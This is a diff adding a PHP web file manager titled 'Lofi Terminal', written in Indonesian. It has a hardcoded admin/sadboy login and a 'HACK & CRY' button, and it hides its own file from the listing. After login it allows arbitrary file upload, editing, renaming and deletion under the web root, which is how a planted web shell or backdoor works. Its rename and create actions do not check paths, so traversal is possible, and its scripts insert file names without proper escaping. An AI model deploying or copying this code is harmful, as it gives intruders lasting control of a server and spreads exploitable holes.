@@ -1,0 +1,748 @@
+<?php
+// --- KONFIGURASI ---
+define('USERNAME', 'admin'); 
+define('PASSWORD', 'sadboy'); 
+define('ROOT_PATH', getcwd()); 
+define('BASE_URL', basename($_SERVER['PHP_SELF'])); 
+
+// --- FUNGSI UTAMA ---
+function get_safe_path($path) {
+    $path = str_replace(array('../', '..\\'), '', $path);
+    $path = trim($path, '/\\');
+    $full_path = realpath(ROOT_PATH . '/' . $path);
+
+    if ($full_path === false || strpos($full_path, ROOT_PATH) !== 0) {
+        return ROOT_PATH;
+    }
+    return $full_path;
+}
+
+function get_current_path() {
+    $path = isset($_GET['p']) ? $_GET['p'] : '';
+    $path = preg_replace('/[^a-zA-Z0-9\/\-_\.]/', '', $path);
+    $safe_path_abs = get_safe_path($path);
+    $current_dir_rel = substr($safe_path_abs, strlen(ROOT_PATH) + 1);
+    return trim($current_dir_rel, '/\\');
+}
+
+// --- LOGIKA LOGIN & SESSION ---
+session_start();
+$error_message = ''; 
+
+if (isset($_POST['action']) && $_POST['action'] === 'login') {
+    if ($_POST['username'] === USERNAME && $_POST['password'] === PASSWORD) {
+        $_SESSION['is_logged_in'] = true;
+        header('Location: ' . BASE_URL);
+        exit;
+    } else {
+        $error_message = 'Akses ditolak. Protokol otorisasi gagal.';
+    }
+}
+
+if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+    session_destroy();
+    header('Location: ' . BASE_URL);
+    exit;
+}
+
+$is_logged_in = isset($_SESSION['is_logged_in']) && $_SESSION['is_logged_in'] === true;
+
+// --- Bagian Pengecekan Login ---
+if (!$is_logged_in) {
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lofi Terminal - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'lofi-dark': '#0d1117',       
+                        'lofi-bg': '#161b22',         
+                        'lofi-text': '#c9d1d9',       
+                        'lofi-accent-lavender': '#bb9af8', 
+                        'lofi-accent-pink': '#f7768e', 
+                        'lofi-terminal': '#21262d',   
+                        'lofi-success': '#3fb950',
+                        'lofi-error': '#f7768e',
+                    },
+                    boxShadow: {
+                        'lofi-glow': '0 0 10px rgba(187, 154, 248, 0.4)',
+                        'lofi-text-glow': '0 0 5px rgba(247, 118, 142, 0.6)',
+                    },
+                    fontFamily: {
+                        mono: ['Roboto Mono', 'monospace'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Roboto Mono', monospace;
+            background-color: theme('colors.lofi-dark');
+            color: theme('colors.lofi-text');
+            /* Hapus background grid yang menyakitkan mata di halaman login */
+        }
+        .lofi-input {
+            background-color: theme('colors.lofi-terminal');
+            border: 1px solid theme('colors.lofi-accent-lavender');
+            border-left: 5px solid theme('colors.lofi-accent-pink');
+            color: theme('colors.lofi-text');
+            box-shadow: 0 0 5px rgba(187, 154, 248, 0.2) inset;
+        }
+        .lofi-input:focus {
+            outline: none;
+            border-left: 5px solid theme('colors.lofi-accent-lavender');
+            box-shadow: theme('boxShadow.lofi-glow');
+        }
+        .lofi-btn {
+            background-color: theme('colors.lofi-accent-pink');
+            color: theme('colors.lofi-dark');
+            font-weight: 700;
+            text-transform: uppercase;
+            box-shadow: 0 0 8px rgba(247, 118, 142, 0.6);
+            transition: all 0.3s;
+        }
+        .lofi-btn:hover {
+            background-color: theme('colors.lofi-accent-lavender');
+            color: theme('colors.lofi-dark');
+            box-shadow: theme('boxShadow.lofi-glow');
+            transform: translateY(-1px);
+        }
+        .swal2-popup {
+            background-color: theme('colors.lofi-bg') !important;
+            color: theme('colors.lofi-text') !important;
+            border: 1px solid theme('colors.lofi-accent-pink') !important;
+            box-shadow: 0 0 15px rgba(247, 118, 142, 0.3) !important;
+            font-family: theme('fontFamily.mono') !important;
+        }
+        .swal2-title {
+            color: theme('colors.lofi-accent-lavender') !important;
+            text-shadow: 0 0 3px rgba(187, 154, 248, 0.8);
+        }
+        .swal2-confirm {
+            background-color: theme('colors.lofi-accent-pink') !important;
+            color: theme('colors.lofi-dark') !important;
+        }
+        .swal2-confirm:hover {
+            background-color: theme('colors.lofi-accent-lavender') !important;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+<div class="w-11/12 max-w-sm p-8 bg-lofi-bg border border-lofi-accent-lavender shadow-2xl shadow-lofi-accent-lavender/30">
+    <h2 class="text-2xl font-bold mb-6 text-lofi-accent-pink text-center border-b border-lofi-accent-pink pb-2 uppercase tracking-wider" style="text-shadow: 0 0 5px rgba(247, 118, 142, 0.8);">
+        <i class="fas fa-terminal mr-2"></i> Access Point
+    </h2>
+    <?php if (!empty($error_message)) : ?>
+        <div class="p-3 mb-4 text-sm text-lofi-error bg-red-900/30 border border-lofi-error text-center" style="box-shadow: 0 0 5px theme('colors.lofi-error');">
+            <?php echo $error_message; ?>
+        </div>
+    <?php endif; ?>
+    <form action="<?php echo BASE_URL; ?>" method="POST">
+        <input type="hidden" name="action" value="login">
+        <div class="mb-4">
+            <input type="text" name="username" class="lofi-input w-full p-3" placeholder=">> username" required>
+        </div>
+        <div class="mb-6">
+            <input type="password" name="password" class="lofi-input w-full p-3" placeholder=">> password" required>
+        </div>
+        <button type="submit" class="lofi-btn w-full p-3 text-lg">
+            <i class="fas fa-sign-in-alt mr-2"></i> HACK & CRY
+        </button>
+    </form>
+</div>
+</body>
+</html>
+<?php
+    exit; 
+}
+// --- AKHIR VIEW LOGIN ---
+
+
+// --- LOGIKA FILE MANAGER (Setelah Login) ---
+$current_dir_rel = get_current_path();
+$current_dir_abs = get_safe_path($current_dir_rel); 
+
+$success_msg = '';
+$error_msg = '';
+
+if (!is_dir($current_dir_abs)) {
+    $current_dir_abs = ROOT_PATH;
+    $current_dir_rel = '';
+    $error_msg = 'Direktori tidak ditemukan. Kembali ke Root.';
+}
+
+// Logika untuk setiap fungsi
+if (isset($_POST['action'])) {
+    $action = $_POST['action'];
+    $current_p_url = '?p=' . urlencode($current_dir_rel); 
+
+    try {
+        switch ($action) {
+            case 'create_dir':
+                $new_dir_name = trim($_POST['new_name']);
+                if (empty($new_dir_name)) throw new Exception('Nama direktori tidak boleh kosong.');
+                
+                $new_path = rtrim($current_dir_abs, '/\\') . DIRECTORY_SEPARATOR . $new_dir_name;
+                
+                if (file_exists($new_path)) throw new Exception('Direktori sudah ada!');
+                
+                if (!mkdir($new_path, 0755)) throw new Exception('Gagal membuat direktori. Izin ditolak? (Coba CHMOD 755)');
+                $success_msg = 'Dataschema "' . htmlspecialchars($new_dir_name) . '" berhasil dibuat!';
+                break;
+
+            case 'create_file':
+                $new_file_name = trim($_POST['new_name']);
+                if (empty($new_file_name)) throw new Exception('Nama file tidak boleh kosong.');
+                
+                $new_path = rtrim($current_dir_abs, '/\\') . DIRECTORY_SEPARATOR . $new_file_name;
+                
+                if (file_exists($new_path)) throw new Exception('File sudah ada!');
+                
+                if (file_put_contents($new_path, '') === false) {
+                     throw new Exception('Gagal membuat file baru. (Izin Tulis Gagal: Coba CHMOD 755 pada folder induk)');
+                }
+
+                $success_msg = 'Data File "' . htmlspecialchars($new_file_name) . '" berhasil dibuat!';
+                break;
+
+            case 'rename':
+                $old_name = trim($_POST['old_name']);
+                $new_name = trim($_POST['new_name']);
+                if (empty($new_name)) throw new Exception('Nama baru tidak boleh kosong.');
+
+                $old_path = get_safe_path($current_dir_rel . '/' . $old_name);
+                
+                $new_path = rtrim(dirname($old_path), '/\\') . DIRECTORY_SEPARATOR . $new_name;
+
+                if ($old_path === ROOT_PATH) throw new Exception('Aksi terlarang. Tidak bisa memanipulasi root.');
+                if (!file_exists($old_path)) throw new Exception('File/Direktori lama tidak ditemukan.');
+
+                if (!rename($old_path, $new_path)) throw new Exception('Gagal mengganti nama. Izin ditolak?');
+                $success_msg = 'Berhasil mengganti nama "' . htmlspecialchars($old_name) . '" menjadi "' . htmlspecialchars($new_name) . '"!';
+                break;
+
+            case 'delete':
+                $target_name = trim($_POST['target_name']);
+                $target_path = get_safe_path($current_dir_rel . '/' . $target_name);
+
+                if ($target_path === ROOT_PATH) throw new Exception('Aksi terlarang. Tidak bisa menghapus root.');
+                if (!file_exists($target_path)) throw new Exception('File/Direktori tidak ditemukan.');
+
+                if (is_dir($target_path)) {
+                    if (count(scandir($target_path)) > 2) { 
+                        throw new Exception('Direktori tidak kosong. Hapus isinya terlebih dahulu.');
+                    }
+                    if (!rmdir($target_path)) throw new Exception('Gagal menghapus direktori kosong. Izin ditolak?');
+                } else {
+                    if (!unlink($target_path)) throw new Exception('Gagal menghapus file. Izin ditolak?');
+                }
+                $success_msg = 'Berhasil menghapus "' . htmlspecialchars($target_name) . '"!';
+                break;
+
+            case 'edit_file':
+                $file_name = trim($_POST['file_name']);
+                $content = $_POST['content'];
+                $file_path = get_safe_path($current_dir_rel . '/' . $file_name);
+
+                if (!is_file($file_path)) throw new Exception('File tidak ditemukan atau bukan file.');
+
+                if (file_put_contents($file_path, $content) === false) throw new Exception('Gagal menyimpan perubahan. Izin ditolak?');
+                $success_msg = 'File "' . htmlspecialchars($file_name) . '" berhasil disimpan!';
+                header('Location: ' . BASE_URL . $current_p_url . '&success=' . urlencode($success_msg));
+                exit;
+
+            case 'upload':
+                if (empty($_FILES['file_upload']['name'])) throw new Exception('Tidak ada file yang dipilih.');
+
+                $file_tmp = $_FILES['file_upload']['tmp_name'];
+                $file_name = basename($_FILES['file_upload']['name']);
+                $target_path = $current_dir_abs . '/' . $file_name;
+
+                if (file_exists($target_path)) throw new Exception('File dengan nama yang sama sudah ada.');
+
+                if (move_uploaded_file($file_tmp, $target_path)) {
+                    $success_msg = 'Asset "' . htmlspecialchars($file_name) . '" berhasil diunggah!';
+                } else {
+                    throw new Exception('Gagal mengunggah file. Ukuran terlalu besar atau masalah izin.');
+                }
+                break;
+
+            default:
+                $error_msg = 'Aksi tidak dikenal.';
+                break;
+        }
+    } catch (Exception $e) {
+        $error_msg = $e->getMessage();
+    }
+    header('Location: ' . BASE_URL . $current_p_url . '&' . ($success_msg ? 'success=' . urlencode($success_msg) : 'error=' . urlencode($error_msg)));
+    exit;
+}
+
+// Logika untuk menampilkan file editor
+$edit_content = null;
+$edit_filename = null;
+if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
+    $edit_filename = basename($_GET['file']);
+    $edit_path = get_safe_path($current_dir_rel . '/' . $edit_filename);
+
+    if (is_file($edit_path)) {
+        $edit_content = file_get_contents($edit_path);
+    } else {
+        $error_msg = 'File untuk edit tidak ditemukan atau bukan file.';
+        $edit_filename = null;
+    }
+}
+
+// Ambil pesan dari URL setelah redirect
+if (isset($_GET['success'])) $success_msg = htmlspecialchars($_GET['success']);
+if (isset($_GET['error'])) $error_msg = htmlspecialchars($_GET['error']);
+
+// Daftar file
+$files = [];
+if (is_dir($current_dir_abs)) {
+    $ignore_files = ['.', '..', basename(__FILE__)]; 
+    $items = array_diff(scandir($current_dir_abs), $ignore_files);
+    
+    foreach ($items as $item) {
+        $path = $current_dir_abs . '/' . $item;
+        $files[] = [
+            'name' => $item,
+            'is_dir' => is_dir($path),
+            'size' => is_file($path) ? round(filesize($path) / 1024, 2) . ' KB' : '-',
+            'modified' => date("Y-m-d H:i:s", filemtime($path))
+        ];
+    }
+    usort($files, function($a, $b) {
+        if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
+        return ($a['is_dir'] > $b['is_dir']) ? -1 : 1;
+    });
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lofi Terminal - <?php echo ($edit_content !== null) ? 'Edit' : 'Manager'; ?></title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'lofi-dark': '#0d1117',
+                        'lofi-bg': '#161b22',
+                        'lofi-text': '#c9d1d9',
+                        'lofi-accent-lavender': '#bb9af8',
+                        'lofi-accent-pink': '#f7768e',
+                        'lofi-terminal': '#21262d',
+                        'lofi-success': '#3fb950',
+                        'lofi-error': '#f7768e',
+                        'lofi-border': '#30363d',
+                        'lofi-grid-line': '#131313', /* Warna grid yang lebih gelap */
+                    },
+                    boxShadow: {
+                        'lofi-glow': '0 0 12px rgba(187, 154, 248, 0.4)',
+                        'lofi-text-glow': '0 0 6px rgba(247, 118, 142, 0.6)',
+                    },
+                    fontFamily: {
+                        mono: ['Roboto Mono', 'monospace'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: theme('fontFamily.mono');
+            background-color: theme('colors.lofi-dark');
+            color: theme('colors.lofi-text');
+            /* GRID FIX: Warna garis grid dibuat sangat gelap */
+            background-image: linear-gradient(to right, theme('colors.lofi-grid-line') 1px, transparent 1px), 
+                              linear-gradient(to bottom, theme('colors.lofi-grid-line') 1px, transparent 1px);
+            background-size: 25px 25px;
+        }
+
+        .lofi-card {
+            background-color: theme('colors.lofi-bg');
+            border: 1px solid theme('colors.lofi-border');
+            box-shadow: 0 4px 15px theme('colors.lofi-dark');
+        }
+
+        .lofi-input, .lofi-textarea {
+            background-color: theme('colors.lofi-terminal');
+            border: 1px solid theme('colors.lofi-border');
+            border-left: 5px solid theme('colors.lofi-accent-lavender');
+            color: theme('colors.lofi-text');
+            box-shadow: 0 0 5px theme('colors.lofi-accent-lavender');
+            transition: all 0.2s;
+        }
+        .lofi-input:focus, .lofi-textarea:focus {
+            outline: none;
+            border-left: 5px solid theme('colors.lofi-accent-pink');
+            box-shadow: theme('boxShadow.lofi-glow');
+        }
+        .lofi-textarea { min-height: 400px; }
+
+        .lofi-btn {
+            padding: 0.75rem 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.1);
+            transition: all 0.3s;
+        }
+        .btn-pink { 
+            background-color: theme('colors.lofi-accent-pink'); 
+            color: theme('colors.lofi-dark');
+        }
+        .btn-lavender { 
+            background-color: theme('colors.lofi-accent-lavender'); 
+            color: theme('colors.lofi-dark');
+        }
+        .btn-red-dark { 
+            background-color: theme('colors.lofi-error'); 
+            color: theme('colors.lofi-dark');
+        }
+
+        .btn-pink:hover {
+            background-color: #e06075;
+            box-shadow: theme('boxShadow.lofi-text-glow');
+            transform: translateY(-1px);
+        }
+        .btn-lavender:hover {
+            background-color: #a787e0;
+            box-shadow: theme('boxShadow.lofi-glow');
+            transform: translateY(-1px);
+        }
+        .btn-red-dark:hover {
+            background-color: #e06075;
+            box-shadow: 0 0 10px rgba(247, 118, 142, 0.8);
+        }
+        
+        .lofi-table th {
+            background-color: theme('colors.lofi-terminal');
+            color: theme('colors.lofi-accent-lavender');
+            border-bottom: 2px solid theme('colors.lofi-accent-pink');
+            text-shadow: 0 0 3px rgba(187, 154, 248, 0.5);
+            text-transform: uppercase;
+        }
+        .lofi-table td { border-bottom: 1px solid theme('colors.lofi-border'); }
+        .lofi-table tr:hover { background-color: #1f242c; }
+        .lofi-table a { color: theme('colors.lofi-accent-pink'); }
+        .lofi-table a:hover { color: theme('colors.lofi-accent-lavender'); }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+<?php if ($edit_content !== null) : // Mode Edit File ?>
+
+    <div class="max-w-4xl mx-auto lofi-card p-6 rounded-lg">
+        <h1 class="text-3xl font-bold mb-6 text-lofi-accent-pink border-b border-lofi-accent-lavender pb-3 uppercase">
+            <i class="fas fa-edit mr-2"></i> EDITING DATA: <?php echo htmlspecialchars($edit_filename); ?>
+        </h1>
+
+        <a href="<?php echo BASE_URL . '?p=' . urlencode($current_dir_rel); ?>" class="lofi-btn btn-lavender inline-block mb-4"><i class="fas fa-arrow-left"></i> RETURN TO SCHEMA</a>
+        
+        <?php if ($success_msg) : ?>
+            <div class="p-3 mb-4 text-sm text-lofi-success bg-green-900/30 border border-lofi-success shadow-md shadow-lofi-success/30"><i class="fas fa-check-circle mr-2"></i> <?php echo $success_msg; ?></div>
+        <?php endif; ?>
+        <?php if ($error_msg) : ?>
+            <div class="p-3 mb-4 text-sm text-lofi-error bg-red-900/30 border border-lofi-error shadow-md shadow-lofi-error/30"><i class="fas fa-exclamation-triangle mr-2"></i> <?php echo $error_msg; ?></div>
+        <?php endif; ?>
+
+        <form action="<?php echo BASE_URL; ?>" method="POST">
+            <input type="hidden" name="action" value="edit_file">
+            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($edit_filename); ?>">
+            <textarea name="content" class="lofi-textarea w-full p-4 mb-4 text-sm"><?php echo htmlspecialchars($edit_content); ?></textarea>
+            <button type="submit" class="lofi-btn btn-pink w-full"><i class="fas fa-save mr-2"></i> SAVE CHANGES</button>
+        </form>
+
+    </div>
+
+<?php else : // Mode File Manager Utama ?>
+
+    <div class="max-w-7xl mx-auto lofi-card p-6 rounded-lg">
+        <div class="flex justify-between items-center mb-6 border-b border-lofi-accent-lavender pb-3">
+            <h1 class="text-3xl font-bold text-lofi-accent-pink uppercase tracking-wider" style="text-shadow: 0 0 5px rgba(247, 118, 142, 0.6);">
+                <i class="fas fa-cloud-moon mr-2"></i> LOFI DATASCHEMA
+            </h1>
+            <a href="<?php echo BASE_URL; ?>?action=logout" class="lofi-btn btn-red-dark text-xs"><i class="fas fa-power-off mr-1"></i> DISCONNECT</a>
+        </div>
+
+        <?php
+        $path_parts = explode('/', $current_dir_rel);
+        $path_link = '';
+        ?>
+        <div class="p-3 mb-4 bg-lofi-terminal border border-lofi-accent-lavender text-lofi-text shadow-md shadow-lofi-accent-lavender/10">
+            <i class="fas fa-map-marked-alt mr-2"></i> CURRENT PATH: 
+            <a href="<?php echo BASE_URL; ?>" class="text-lofi-accent-lavender font-bold">ROOT</a>
+            <?php foreach ($path_parts as $part): ?>
+                <?php
+                if (!$part) continue;
+                $path_link .= '/' . $part;
+                ?>
+                / <a href="<?php echo BASE_URL . '?p=' . urlencode(trim($path_link, '/')); ?>" class="text-lofi-accent-pink hover:text-lofi-accent-lavender"><?php echo htmlspecialchars($part); ?></a>
+            <?php endforeach; ?>
+        </div>
+
+        <?php if ($success_msg) : ?>
+            <div class="p-3 mb-4 text-sm text-lofi-success bg-green-900/30 border border-lofi-success shadow-md shadow-lofi-success/30"><i class="fas fa-check-circle mr-2"></i> <?php echo $success_msg; ?></div>
+        <?php endif; ?>
+        <?php if ($error_msg) : ?>
+            <div class="p-3 mb-4 text-sm text-lofi-error bg-red-900/30 border border-lofi-error shadow-md shadow-lofi-error/30"><i class="fas fa-exclamation-triangle mr-2"></i> <?php echo $error_msg; ?></div>
+        <?php endif; ?>
+
+        <div class="mb-6 flex flex-wrap gap-3">
+            <button class="lofi-btn btn-lavender flex-1 sm:flex-none" onclick="showCreateModal('file')"><i class="fas fa-file-plus mr-1"></i> CREATE FILE</button>
+            <button class="lofi-btn btn-lavender flex-1 sm:flex-none" onclick="showCreateModal('dir')"><i class="fas fa-folder-plus mr-1"></i> CREATE DIR</button>
+            <button class="lofi-btn btn-pink flex-1 sm:flex-none" onclick="showUploadModal()"><i class="fas fa-upload mr-1"></i> UPLOAD ASSET</button>
+        </div>
+
+        <div class="overflow-x-auto">
+            <table class="w-full text-sm text-left lofi-table">
+                <thead>
+                    <tr>
+                        <th class="p-3">NAME</th>
+                        <th class="p-3 w-20">TYPE</th>
+                        <th class="p-3 w-20">SIZE</th>
+                        <th class="p-3 w-32">LAST MODIFIED</th>
+                        <th class="p-3 w-56 text-right">ACTIONS</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php if ($current_dir_rel): ?>
+                    <tr class="transition">
+                        <td class="p-3">
+                            <?php
+                            $parent_dir = dirname($current_dir_rel);
+                            if ($parent_dir == '.') $parent_dir = '';
+                            ?>
+                            <a href="<?php echo BASE_URL . ($parent_dir ? '?p=' . urlencode($parent_dir) : ''); ?>">
+                                <i class="fas fa-level-up-alt text-lofi-text/50 mr-2"></i> .. [BACK]
+                            </a>
+                        </td>
+                        <td class="p-3">-</td>
+                        <td class="p-3">-</td>
+                        <td class="p-3">-</td>
+                        <td class="p-3"></td>
+                    </tr>
+                    <?php endif; ?>
+
+                    <?php foreach ($files as $file) : ?>
+                    <tr class="transition">
+                        <td class="p-3">
+                            <?php if ($file['is_dir']) : ?>
+                                <a href="<?php echo BASE_URL . '?p=' . urlencode(trim($current_dir_rel . '/' . $file['name'], '/')); ?>">
+                                    <i class="fas fa-folder text-lofi-accent-lavender mr-2"></i> <?php echo htmlspecialchars($file['name']); ?>
+                                </a>
+                            <?php else : ?>
+                                <i class="fas fa-file-code text-lofi-accent-pink mr-2"></i> <?php echo htmlspecialchars($file['name']); ?>
+                            <?php endif; ?>
+                        </td>
+                        <td class="p-3"><?php echo $file['is_dir'] ? 'SCHEMA' : 'DATA'; ?></td>
+                        <td class="p-3"><?php echo $file['size']; ?></td>
+                        <td class="p-3"><?php echo $file['modified']; ?></td>
+                        <td class="p-3 text-right whitespace-nowrap space-x-2">
+                            <button class="lofi-btn btn-lavender text-xs p-2" title="Rename" onclick="showRenameModal('<?php echo htmlspecialchars($file['name']); ?>')"><i class="fas fa-i-cursor"></i></button>
+                            <?php if (!$file['is_dir']) : ?>
+                                <a href="<?php echo BASE_URL . '?action=edit&file=' . urlencode($file['name']) . '&p=' . urlencode($current_dir_rel); ?>" class="lofi-btn btn-pink text-xs p-2" title="Edit Content"><i class="fas fa-edit"></i></a>
+                            <?php endif; ?>
+                            <button class="lofi-btn btn-red-dark text-xs p-2" title="Delete" onclick="showDeleteConfirm('<?php echo htmlspecialchars($file['name']); ?>', <?php echo $file['is_dir'] ? 'true' : 'false'; ?>)"><i class="fas fa-trash-alt"></i></button>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+<?php endif; ?>
+
+</body>
+</html>
+
+
+<script>
+// =========================================================================
+//                                 JAVASCRIPT / JQUERY
+// =========================================================================
+
+// SweetAlert Mixin for Sadboy Style
+Swal.mixin({
+    customClass: {
+        popup: 'swal2-popup',
+        title: 'swal2-title',
+        confirmButton: 'swal2-confirm',
+        cancelButton: 'swal2-cancel'
+    },
+    buttonsStyling: false,
+    backdrop: `rgba(0,0,0,0.8)`
+});
+
+$(document).ready(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const successMsg = urlParams.get('success');
+    const errorMsg = urlParams.get('error');
+
+    if (successMsg || errorMsg) {
+        history.replaceState({}, document.title, window.location.pathname + window.location.search.replace(/(\?|&)(success|error)=[^&]*/g, ''));
+    }
+
+    if (successMsg) {
+        Swal.fire({
+            icon: 'success',
+            title: 'Protocol Success',
+            text: successMsg,
+            iconColor: tailwind.config.theme.extend.colors['lofi-success'],
+        });
+    }
+
+    if (errorMsg) {
+        Swal.fire({
+            icon: 'error',
+            title: 'Heartbreak Error',
+            text: errorMsg,
+            iconColor: tailwind.config.theme.extend.colors['lofi-error'],
+        });
+    }
+});
+
+function showCreateModal(type) {
+    const action = type === 'dir' ? 'create_dir' : 'create_file';
+    const title = type === 'dir' ? 'CREATE DATASCHEMA' : 'CREATE DATA FILE';
+    const color = type === 'dir' ? 'lofi-accent-lavender' : 'lofi-accent-pink';
+
+    Swal.fire({
+        title: title,
+        html: `
+            <form id="createForm" action="<?php echo BASE_URL; ?>" method="POST">
+                <input type="hidden" name="action" value="${action}">
+                <input type="hidden" name="p" value="<?php echo htmlspecialchars($current_dir_rel); ?>">
+                <div class="mt-3">
+                    <input type="text" id="newName" name="new_name" class="lofi-input w-full p-3 text-sm" placeholder=">> Enter Name" required>
+                </div>
+            </form>
+        `,
+        focusConfirm: false,
+        showCancelButton: true,
+        confirmButtonText: '<i class="fas fa-plus"></i> EXECUTE',
+        cancelButtonText: '<i class="fas fa-times"></i> ABORT',
+        preConfirm: () => {
+            const name = $('#newName').val();
+            if (!name) {
+                Swal.showValidationMessage('Name cannot be empty.');
+                return false;
+            }
+            return true;
+        }
+    }).then((result) => {
+        if (result.isConfirmed) {
+            $('#createForm').submit();
+        }
+    });
+}
+
+function showRenameModal(oldName) {
+    Swal.fire({
+        title: 'RENAME DATA',
+        html: `
+            <form id="renameForm" action="<?php echo BASE_URL; ?>" method="POST">
+                <input type="hidden" name="action" value="rename">
+                <input type="hidden" name="p" value="<?php echo htmlspecialchars($current_dir_rel); ?>">
+                <input type="hidden" name="old_name" value="${oldName}">
+                <div class="mt-3">
+                    <input type="text" id="newName" name="new_name" class="lofi-input w-full p-3 text-sm" value="${oldName}" required>
+                </div>
+            </form>
+        `,
+        focusConfirm: false,
+        showCancelButton: true,
+        confirmButtonText: '<i class="fas fa-sync-alt"></i> RENAME',
+        cancelButtonText: '<i class="fas fa-times"></i> ABORT',
+        preConfirm: () => {
+            const newName = $('#newName').val();
+            if (!newName) {
+                Swal.showValidationMessage('New name cannot be empty.');
+                return false;
+            }
+            return true;
+        }
+    }).then((result) => {
+        if (result.isConfirmed) {
+            $('#renameForm').submit();
+        }
+    });
+}
+
+function showDeleteConfirm(targetName, isDir) {
+    Swal.fire({
+        title: 'CONFIRM DATA WIPE',
+        text: `You are about to permanently delete ${isDir ? 'SCHEMA' : 'DATA FILE'} "${targetName}". This action is irreversible.`,
+        icon: 'warning',
+        iconColor: tailwind.config.theme.extend.colors['lofi-error'],
+        showCancelButton: true,
+        confirmButtonText: '<i class="fas fa-skull-crossbones"></i> WIPE (SAD)',
+        cancelButtonText: '<i class="fas fa-times"></i> CANCEL (HAPPY)'
+    }).then((result) => {
+        if (result.isConfirmed) {
+            const form = $('<form action="<?php echo BASE_URL; ?>" method="POST" style="display:none;"></form>');
+            form.append('<input type="hidden" name="action" value="delete">');
+            form.append('<input type="hidden" name="p" value="<?php echo htmlspecialchars($current_dir_rel); ?>">');
+            form.append(`<input type="hidden" name="target_name" value="${targetName}">`);
+            $('body').append(form);
+            form.submit();
+        }
+    });
+}
+
+function showUploadModal() {
+    Swal.fire({
+        title: 'UPLOAD NEW ASSET',
+        html: `
+            <form id="uploadForm" action="<?php echo BASE_URL; ?>" method="POST" enctype="multipart/form-data">
+                <input type="hidden" name="action" value="upload">
+                <input type="hidden" name="p" value="<?php echo htmlspecialchars($current_dir_rel); ?>">
+                <div class="mt-3">
+                    <input type="file" id="file_upload" name="file_upload" required style="width: 100%; padding: 10px; border: 1px dashed ${tailwind.config.theme.extend.colors['lofi-accent-pink']}; background-color: #21262d; color: #c9d1d9;">
+                </div>
+            </form>
+        `,
+        focusConfirm: false,
+        showCancelButton: true,
+        confirmButtonText: '<i class="fas fa-upload"></i> INITIATE TRANSFER',
+        cancelButtonText: '<i class="fas fa-times"></i> ABORT',
+        preConfirm: () => {
+            const fileInput = document.getElementById('file_upload');
+            if (fileInput.files.length === 0) {
+                Swal.showValidationMessage('Select file first!');
+                return false;
+            }
+            return true;
+        }
+    }).then((result) => {
+        if (result.isConfirmed) {
+            $('#uploadForm').submit();
+        }
+    });
+}
+</script>
